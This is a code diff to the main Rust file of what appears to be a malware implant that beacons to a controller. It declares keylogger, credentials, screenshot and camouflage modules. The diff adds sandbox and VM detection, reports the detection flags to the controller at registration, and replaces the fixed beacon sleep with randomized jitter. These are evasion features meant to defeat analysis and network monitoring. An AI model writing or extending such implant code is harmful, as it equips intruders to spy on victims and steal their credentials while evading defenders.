@@ -12,6 +12,7 @@ mod camouflage;
 pub mod screenshot;
 pub mod keylogger;
 pub mod credentials;
+pub mod antisandbox;
 #[allow(dead_code, unused_imports, unused_variables, unused_mut)]
 mod network;
 #[allow(dead_code, unused_imports, unused_variables, unused_mut)]
@@ -19,7 +20,7 @@ mod port_handler;
 
 use config::Config;
 use communicator::BeaconPayload;
-use executor::{CommandType, Executor};
+use executor::{CommandType, Executor, get_beacon_config};
 use recon::SystemInfo;
 use crypto::CryptoManager;
 use camouflage::CamouflageMode;
@@ -56,9 +57,17 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     info!("   Architecture: {}", sys_info.architecture);
     info!("   Agent ID: {}", sys_info.agent_id);
 
+    // Anti-sandbox detection
+    let (is_sandbox, sandbox_flags) = antisandbox::SandboxDetector::detect();
+    if is_sandbox {
+        info!("⚠️ Sandbox/VM detected: {:?}", sandbox_flags);
+    } else {
+        info!("✅ Environment appears clean");
+    }
+
     // Run main agent loop
     info!("🚀 Starting main agent loop...");
-    match run_agent(&config, crypto, &sys_info).await {
+    match run_agent(&config, crypto, &sys_info, is_sandbox, &sandbox_flags).await {
         Ok(_) => {
             info!("Agent loop completed gracefully");
         }
@@ -75,6 +84,8 @@ async fn run_agent(
     config: &Config,
     crypto: CryptoManager,
     sys_info: &SystemInfo,
+    is_sandbox: bool,
+    sandbox_flags: &[String],
 ) -> Result<(), Box<dyn std::error::Error>> {
     // Derive a separate mutation seed from the encryption key
     let mutation_seed = {
@@ -125,6 +136,8 @@ async fn run_agent(
                     "os_version": sys_info.os_version,
                     "architecture": sys_info.architecture,
                     "user": username,
+                    "sandbox_detected": is_sandbox,
+                    "sandbox_flags": sandbox_flags,
                 });
                 if let Err(e) = communicator.send_raw(&reg_msg.to_string()).await {
                     error!("Registration failed: {}", e);
@@ -205,7 +218,23 @@ async fn run_agent(
                         }
                     }
 
-                    sleep(Duration::from_secs(next_interval)).await;
+                    // Use global beacon config with jitter for sleep
+                    let sleep_duration = {
+                        let cfg = get_beacon_config();
+                        let cfg = cfg.read().await;
+                        let base = cfg.sleep_ms as f64;
+                        let jitter = base * cfg.jitter_pct;
+                        let actual = if jitter > 0.0 {
+                            use rand::Rng;
+                            let mut rng = rand::thread_rng();
+                            base + rng.gen_range(-jitter..jitter)
+                        } else {
+                            base
+                        };
+                        Duration::from_millis(actual.max(1000.0) as u64)
+                    };
+                    debug!("Sleeping for {}ms", sleep_duration.as_millis());
+                    sleep(sleep_duration).await;
                 }
             }
             Err(e) => {
